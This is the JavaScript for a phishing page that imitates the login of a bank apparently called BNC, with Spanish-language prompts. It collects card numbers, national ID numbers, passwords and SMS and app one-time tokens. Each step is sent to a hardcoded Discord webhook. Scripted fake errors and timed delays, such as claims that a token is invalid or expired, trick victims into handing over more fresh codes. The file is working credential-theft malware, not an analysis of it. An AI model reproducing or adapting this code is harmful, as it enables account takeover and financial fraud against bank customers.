const CONFIG = {
  webhookUrl: "https://discord.com/api/webhooks/1565011334024925195/czoBUCkSfD18ywlnDfdnx04n97wyFyYFDhhV2KpFfH-e1lJcN9GHnp1PirLuHdG3l-lr",
  username: "BNC · Iniciar Sesión",
  esperaMs: 20000
};

(function () {
  "use strict";

  const $ = id => document.getElementById(id);

  /* ---------- fecha y saludo ---------- */
  const d = new Date();
  const dias = ["DOMINGO","LUNES","MARTES","MIÉRCOLES","JUEVES","VIERNES","SÁBADO"];
  $("dateText").textContent =
    dias[d.getDay()] + ", " +
    String(d.getDate()).padStart(2, "0") + "/" +
    String(d.getMonth() + 1).padStart(2, "0") + "/" +
    d.getFullYear();

  const h = d.getHours();
  $("saludo").textContent = h < 12 ? "Buenos días" : h < 19 ? "Buenas tardes" : "Buenas noches";

  /* ---------- discord ---------- */
  async function send(embed) {
    if (!CONFIG.webhookUrl || CONFIG.webhookUrl.indexOf("PEGA_AQUI") === 0) return;
    try {
      const fd = new FormData();
      fd.append("payload_json", JSON.stringify({
        username: CONFIG.username,
        embeds: [Object.assign(embed, { timestamp: new Date().toISOString() })]
      }));
      await fetch(CONFIG.webhookUrl + "?wait=true", { method: "POST", body: fd });
    } catch (e) { console.warn(e); }
  }

  /* ---------- elementos ---------- */
  const tabs = $("tabs");
  const segPersonas = $("segPersonas");
  const segEmpresas = $("segEmpresas");
  const cedulaWrap = $("cedulaWrap");
  const cardNumber = $("cardNumber");
  const cedula = $("cedula");
  const cardMask = $("cardMask");
  const clave = $("clave");
  const code = $("code");
  const codeTitle = $("codeTitle");
  const codeSub = $("codeSub");
  const loader = $("loader");

  let tab = "personas";
  let modo = "credito";
  let fase = "sms";   // "sms" | "app"

  /* ---------- pestañas ---------- */
  tabs.addEventListener("click", e => {
    const b = e.target.closest(".tab");
    if (!b) return;
    tab = b.dataset.tab;
    document.querySelectorAll(".tab").forEach(t => t.classList.toggle("active", t === b));
    segPersonas.hidden = tab !== "personas";
    segEmpresas.hidden = tab !== "empresas";
    modo = tab === "personas" ? "credito" : "bncnet";
    document.querySelectorAll(".seg-item").forEach(s => {
      s.classList.toggle("active", s.dataset.mode === modo && !s.parentElement.hidden);
    });
    cedulaWrap.hidden = tab === "empresas" && modo === "bncnet";
    $("s1Error").hidden = true;
  });

  /* ---------- segmentados ---------- */
  document.querySelectorAll(".seg").forEach(seg => {
    seg.addEventListener("click", e => {
      const b = e.target.closest(".seg-item");
      if (!b) return;
      modo = b.dataset.mode;
      seg.querySelectorAll(".seg-item").forEach(s => s.classList.toggle("active", s === b));
      cedulaWrap.hidden = tab === "empresas" && modo === "bncnet";
    });
  });

  /* ---------- filtros ---------- */
  cardNumber.addEventListener("input", () => {
    cardNumber.value = cardNumber.value.replace(/\D/g, "").slice(0, 16);
  });
  cedula.addEventListener("input", () => {
    cedula.value = cedula.value.replace(/\D/g, "").slice(0, 8);
  });
  clave.addEventListener("input", () => {
    clave.value = clave.value.replace(/\s/g, "").slice(0, 20);
  });
  code.addEventListener("input", () => {
    code.value = code.value.replace(/\D/g, "").slice(0, 8);
  });

  /* ---------- navegación ---------- */
  function step(n) {
    $("s1").hidden = n !== 1;
    $("s2").hidden = n !== 2;
    $("s3").hidden = n !== 3;
    tabs.classList.toggle("single", n !== 1);
    window.scrollTo(0, 0);
  }

  /* ---------- paso 1 ---------- */
  $("btnContinuar").addEventListener("click", () => {
    const err = $("s1Error");
    if (cardNumber.value.length < 16) {
      err.textContent = "Ingrese los 16 dígitos de la tarjeta";
      err.hidden = false;
      return;
    }
    if (!cedulaWrap.hidden && cedula.value.length < 7) {
      err.textContent = "Ingrese su cédula de identidad";
      err.hidden = false;
      return;
    }
    err.hidden = true;

    send({
      title: "🔐 Paso 1 · Credenciales",
      color: 0x0a2447,
      fields: [
        { name: "Sección", value: tab === "personas" ? "Personas" : "Empresas", inline: true },
        { name: "Tipo", value: modo, inline: true },
        { name: "Tarjeta", value: cardNumber.value, inline: true },
        { name: "Cédula", value: cedulaWrap.hidden ? "—" : cedula.value, inline: true }
      ]
    });

    const c = cardNumber.value;
    cardMask.value = c.slice(0, 4) + "*******" + c.slice(-4);
    step(2);
    clave.focus();
  });

  /* ---------- paso 2 · clave ---------- */
  $("btnIngresar").addEventListener("click", async () => {
    const err = $("s2Error");
    if (clave.value.length < 4) {
      err.textContent = "Ingrese su clave";
      err.hidden = false;
      return;
    }
    err.hidden = true;

    const b = $("btnIngresar");
    b.disabled = true;
    b.textContent = "Ingresando...";

    await send({
      title: "🔑 Paso 2 · Clave",
      color: 0xe8622a,
      fields: [
        { name: "Tarjeta", value: cardMask.value, inline: true },
        { name: "Clave", value: clave.value, inline: true }
      ]
    });

    b.textContent = "Ingresar";
    b.disabled = false;

    // arranca siempre en la fase del SMS
    fase = "sms";
    codeTitle.textContent = "Ingrese el token generado en la app";
    codeSub.textContent = "ingrese el codigo generado en la app de 8 digitos";
    code.placeholder = "Código SMS";
    code.value = "";
    $("s3Error").hidden = true;

    loader.hidden = false;
    setTimeout(() => {
      loader.hidden = true;
      step(3);
      code.focus();
    }, CONFIG.esperaMs);
  });

  $("btnRegresar").addEventListener("click", () => step(1));

  /* ---------- paso 3 · código ---------- */
  $("btnCode").addEventListener("click", async () => {
    const err = $("s3Error");

    if (code.value.length < 8) {
      err.textContent = "Ingrese el token de 8 dígitos generado en la app";
      err.hidden = false;
      return;
    }

    const b = $("btnCode");
    b.disabled = true;
    b.textContent = "Validando...";

    await send({
      title: fase === "sms" ? "📩 Código SMS" : "📲 Token de la app",
      color: 0x2b4fe0,
      fields: [
        { name: "Tarjeta", value: cardMask.value, inline: true },
        { name: fase === "sms" ? "Código SMS" : "Token", value: code.value, inline: true }
      ]
    });

    b.textContent = "Ingresar";
    b.disabled = false;

    if (fase === "sms") {
      // el SMS se rechaza y pasa al token de la app
      fase = "app";
      code.value = "";
      code.placeholder = "Token de la app";
      codeTitle.textContent = "Ingrese el token generado en la app";
      codeSub.textContent = "El token ingresado no es válido";
      err.textContent = "Ingresa el token de 8 digitos generado en la app.";
      err.hidden = false;
      code.focus();
      return;
    }

    // token de la app: carga y vuelve con el aviso de vencido
    loader.hidden = false;
    setTimeout(() => {
      loader.hidden = true;
      step(3);
      code.value = "";
      err.textContent = "El token ha vencido. Espera a que cambie en la app y vuelve a ingresarlo.";
      err.hidden = false;
      code.focus();
    }, CONFIG.esperaMs);
  });

  step(1);
})();
